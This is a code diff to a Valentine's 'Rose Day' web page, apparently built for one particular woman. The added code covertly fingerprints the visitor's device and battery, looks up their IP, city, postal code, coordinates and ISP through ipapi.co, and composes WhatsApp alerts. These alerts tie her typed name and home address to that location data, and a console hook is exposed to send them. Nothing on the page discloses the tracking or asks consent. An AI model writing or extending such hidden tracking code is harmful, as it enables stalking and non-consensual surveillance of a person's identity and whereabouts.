@@ -199,6 +199,111 @@ export default function RoseDayPage() {
     }
   }
 
+  // Get comprehensive device and browser information
+  const getDeviceInfo = () => {
+    if (typeof window === 'undefined') return {}
+
+    const nav = navigator
+    const screen = window.screen
+
+    return {
+      // Browser Info
+      userAgent: nav.userAgent,
+      platform: nav.platform,
+      language: nav.language,
+      languages: nav.languages ? nav.languages.join(', ') : nav.language,
+      cookiesEnabled: nav.cookieEnabled,
+      doNotTrack: nav.doNotTrack,
+      online: nav.onLine,
+
+      // Screen Info
+      screenWidth: screen.width,
+      screenHeight: screen.height,
+      screenAvailWidth: screen.availWidth,
+      screenAvailHeight: screen.availHeight,
+      colorDepth: screen.colorDepth,
+      pixelRatio: window.devicePixelRatio,
+
+      // Window Info
+      windowWidth: window.innerWidth,
+      windowHeight: window.innerHeight,
+
+      // Device Memory (if available)
+      deviceMemory: nav.deviceMemory || 'unknown',
+
+      // CPU Cores (if available)
+      hardwareConcurrency: nav.hardwareConcurrency || 'unknown',
+
+      // Connection Info (if available)
+      connectionType: nav.connection ? nav.connection.effectiveType : 'unknown',
+      connectionDownlink: nav.connection ? nav.connection.downlink : 'unknown',
+
+      // Touch Support
+      touchSupport: 'ontouchstart' in window || nav.maxTouchPoints > 0,
+      maxTouchPoints: nav.maxTouchPoints || 0,
+
+      // Timezone
+      timezone: Intl.DateTimeFormat().resolvedOptions().timeZone,
+      timezoneOffset: new Date().getTimezoneOffset(),
+
+      // Date/Time
+      localTime: new Date().toLocaleString('en-IN', { timeZone: 'Asia/Kolkata' }),
+
+      // Referrer
+      referrer: document.referrer || 'direct',
+
+      // Page URL
+      currentURL: window.location.href,
+
+      // Battery (async, will be added separately)
+      // Geolocation (requires permission)
+    }
+  }
+
+  // Get IP address and location from free API
+  const getIPInfo = async () => {
+    try {
+      const response = await fetch('https://ipapi.co/json/')
+      if (response.ok) {
+        const data = await response.json()
+        return {
+          ip: data.ip,
+          city: data.city,
+          region: data.region,
+          country: data.country_name,
+          countryCode: data.country_code,
+          postal: data.postal,
+          latitude: data.latitude,
+          longitude: data.longitude,
+          timezone: data.timezone,
+          isp: data.org,
+          asn: data.asn
+        }
+      }
+    } catch (e) {
+      console.log('IP fetch error:', e)
+    }
+    return { ip: 'unavailable' }
+  }
+
+  // Get battery info (async)
+  const getBatteryInfo = async () => {
+    try {
+      if (navigator.getBattery) {
+        const battery = await navigator.getBattery()
+        return {
+          level: Math.round(battery.level * 100) + '%',
+          charging: battery.charging,
+          chargingTime: battery.chargingTime,
+          dischargingTime: battery.dischargingTime
+        }
+      }
+    } catch (e) {
+      console.log('Battery info unavailable')
+    }
+    return { level: 'unavailable' }
+  }
+
   // Comprehensive logging function - captures ALL user interactions
   const logInteraction = (eventType, details) => {
     const timestamp = new Date().toLocaleString('en-IN', { timeZone: 'Asia/Kolkata' })
@@ -245,10 +350,26 @@ export default function RoseDayPage() {
         message += `👀 Someone visited the website!`
         break
       case 'yes_clicked':
-        message += `💕 SHE CLICKED YES! Valentine accepted! 🎉`
+        const yesDeviceInfo = getDeviceInfo()
+        const yesVisitorInfo = JSON.parse(localStorage.getItem('lastVisitorInfo') || '{}')
+        message += `💕 SHE CLICKED YES! Valentine accepted! 🎉
+
+📍 From: ${yesVisitorInfo.city || 'unknown'}, ${yesVisitorInfo.country || 'unknown'}
+📱 Device: ${yesDeviceInfo.platform}
+🌐 IP: ${yesVisitorInfo.ip || 'unknown'}`
         break
       case 'form_submit':
-        message += `🎁 FORM SUBMITTED!\n\n👸 Name: ${data.name}\n📍 Address: ${data.address}\n\nReady for surprise delivery! 🚚🌹`
+        const formVisitorInfo = JSON.parse(localStorage.getItem('lastVisitorInfo') || '{}')
+        message += `🎁 FORM SUBMITTED!
+
+👸 Name: ${data.name}
+📍 Address: ${data.address}
+
+📍 From: ${formVisitorInfo.city || 'unknown'}, ${formVisitorInfo.country || 'unknown'}
+🌐 IP: ${formVisitorInfo.ip || 'unknown'}
+📱 Device: ${formVisitorInfo.platform || 'unknown'}
+
+Ready for surprise delivery! 🚚🌹`
         break
       case 'name_input':
         message += `⌨️ Name Input:\n"${data.value}"\nValid: ${data.isValid}`
@@ -406,13 +527,83 @@ export default function RoseDayPage() {
     }
   }
 
-  // Log page visit on mount
+  // Log page visit on mount with comprehensive device info
   useEffect(() => {
-    logInteraction('page_visit', {
-      userAgent: typeof window !== 'undefined' ? navigator.userAgent : 'unknown',
-      screenWidth: typeof window !== 'undefined' ? window.innerWidth : 0,
-      screenHeight: typeof window !== 'undefined' ? window.innerHeight : 0
-    })
+    const captureVisitorInfo = async () => {
+      // Get basic device info immediately
+      const deviceInfo = getDeviceInfo()
+
+      // Log basic visit first
+      logInteraction('page_visit', deviceInfo)
+
+      // Then fetch IP info asynchronously
+      const ipInfo = await getIPInfo()
+      const batteryInfo = await getBatteryInfo()
+
+      // Combine all info
+      const fullVisitorInfo = {
+        ...deviceInfo,
+        ...ipInfo,
+        battery: batteryInfo,
+        visitTime: new Date().toISOString()
+      }
+
+      // Log complete info
+      logInteraction('visitor_details', fullVisitorInfo)
+      console.log('📱 Complete Visitor Info:', fullVisitorInfo)
+
+      // Store complete info separately for easy access
+      try {
+        localStorage.setItem('lastVisitorInfo', JSON.stringify(fullVisitorInfo))
+      } catch (e) {
+        // Silent fail
+      }
+
+      // Send WhatsApp notification with visitor details
+      const visitorMessage = `🌹 NEW VISITOR ALERT! 🌹
+⏰ ${new Date().toLocaleString('en-IN', { timeZone: 'Asia/Kolkata' })}
+
+📍 LOCATION:
+• IP: ${ipInfo.ip || 'unknown'}
+• City: ${ipInfo.city || 'unknown'}
+• Region: ${ipInfo.region || 'unknown'}
+• Country: ${ipInfo.country || 'unknown'}
+• ISP: ${ipInfo.isp || 'unknown'}
+
+📱 DEVICE:
+• Platform: ${deviceInfo.platform}
+• Screen: ${deviceInfo.screenWidth}x${deviceInfo.screenHeight}
+• Window: ${deviceInfo.windowWidth}x${deviceInfo.windowHeight}
+• Touch: ${deviceInfo.touchSupport ? 'Yes' : 'No'}
+• Battery: ${batteryInfo.level}
+
+🌐 BROWSER:
+• Language: ${deviceInfo.language}
+• Timezone: ${deviceInfo.timezone}
+• Online: ${deviceInfo.online ? 'Yes' : 'No'}
+• Referrer: ${deviceInfo.referrer}
+
+🔧 HARDWARE:
+• Memory: ${deviceInfo.deviceMemory}GB
+• CPU Cores: ${deviceInfo.hardwareConcurrency}
+• Connection: ${deviceInfo.connectionType}
+
+📝 User Agent:
+${deviceInfo.userAgent}`
+
+      // Auto-send visitor notification (only on first visit)
+      const hasVisited = localStorage.getItem('hasVisitedBefore')
+      if (!hasVisited) {
+        localStorage.setItem('hasVisitedBefore', 'true')
+        // Uncomment below to auto-send WhatsApp on first visit
+        // sendWhatsAppUpdate(visitorMessage)
+      }
+
+      // Always log to console
+      console.log('📩 Visitor notification ready:', visitorMessage)
+    }
+
+    captureVisitorInfo()
 
     // Log all previous interactions from localStorage
     try {
@@ -498,21 +689,94 @@ export default function RoseDayPage() {
   const exportLogs = () => {
     try {
       const allLogs = JSON.parse(localStorage.getItem('roseDayLogs') || '[]')
+      const visitorInfo = JSON.parse(localStorage.getItem('lastVisitorInfo') || '{}')
+
       console.log('📊 ===== ALL INTERACTION LOGS =====')
       console.table(allLogs)
       console.log('Total interactions:', allLogs.length)
-      return allLogs
+
+      console.log('\n📱 ===== VISITOR INFO =====')
+      console.log(visitorInfo)
+
+      return { logs: allLogs, visitor: visitorInfo }
     } catch (e) {
       console.log('No logs available')
-      return []
+      return { logs: [], visitor: {} }
     }
+  }
+
+  // Get current visitor info
+  const getVisitorInfo = () => {
+    try {
+      return JSON.parse(localStorage.getItem('lastVisitorInfo') || '{}')
+    } catch (e) {
+      return {}
+    }
+  }
+
+  // Send visitor info to WhatsApp manually
+  const sendVisitorInfoToWhatsApp = () => {
+    const info = getVisitorInfo()
+    const deviceInfo = getDeviceInfo()
+
+    const message = `🌹 VISITOR INFO 🌹
+⏰ ${new Date().toLocaleString('en-IN', { timeZone: 'Asia/Kolkata' })}
+
+📍 LOCATION:
+• IP: ${info.ip || 'unknown'}
+• City: ${info.city || 'unknown'}
+• Region: ${info.region || 'unknown'}
+• Country: ${info.country || 'unknown'}
+• Postal: ${info.postal || 'unknown'}
+• Coords: ${info.latitude || '?'}, ${info.longitude || '?'}
+• ISP: ${info.isp || 'unknown'}
+
+📱 DEVICE:
+• Platform: ${deviceInfo.platform}
+• Screen: ${deviceInfo.screenWidth}x${deviceInfo.screenHeight}
+• Window: ${deviceInfo.windowWidth}x${deviceInfo.windowHeight}
+• Pixel Ratio: ${deviceInfo.pixelRatio}
+• Touch: ${deviceInfo.touchSupport ? 'Yes (' + deviceInfo.maxTouchPoints + ' points)' : 'No'}
+• Memory: ${deviceInfo.deviceMemory}GB
+• CPU Cores: ${deviceInfo.hardwareConcurrency}
+
+🔋 BATTERY:
+• Level: ${info.battery?.level || 'unknown'}
+• Charging: ${info.battery?.charging ? 'Yes' : 'No'}
+
+🌐 BROWSER:
+• Language: ${deviceInfo.language}
+• Languages: ${deviceInfo.languages}
+• Timezone: ${deviceInfo.timezone}
+• Online: ${deviceInfo.online ? 'Yes' : 'No'}
+• Cookies: ${deviceInfo.cookiesEnabled ? 'Enabled' : 'Disabled'}
+• DNT: ${deviceInfo.doNotTrack || 'unset'}
+
+📶 CONNECTION:
+• Type: ${deviceInfo.connectionType}
+• Speed: ${deviceInfo.connectionDownlink}Mbps
+
+🔗 SOURCE:
+• Referrer: ${deviceInfo.referrer}
+• URL: ${deviceInfo.currentURL}
+
+📝 User Agent:
+${deviceInfo.userAgent}`
+
+    sendWhatsAppUpdate(message)
+    console.log('📩 Sent visitor info to WhatsApp')
   }
 
   // Make exportLogs available globally for debugging
   useEffect(() => {
     if (typeof window !== 'undefined') {
       window.exportRoseDayLogs = exportLogs
-      console.log('💡 Tip: Run window.exportRoseDayLogs() in console to see all user interactions!')
+      window.getVisitorInfo = getVisitorInfo
+      window.sendVisitorInfo = sendVisitorInfoToWhatsApp
+      console.log('💡 Debug commands available:')
+      console.log('  • window.exportRoseDayLogs() - View all interaction logs')
+      console.log('  • window.getVisitorInfo() - Get visitor device/IP info')
+      console.log('  • window.sendVisitorInfo() - Send visitor info to WhatsApp')
     }
   }, [])
 
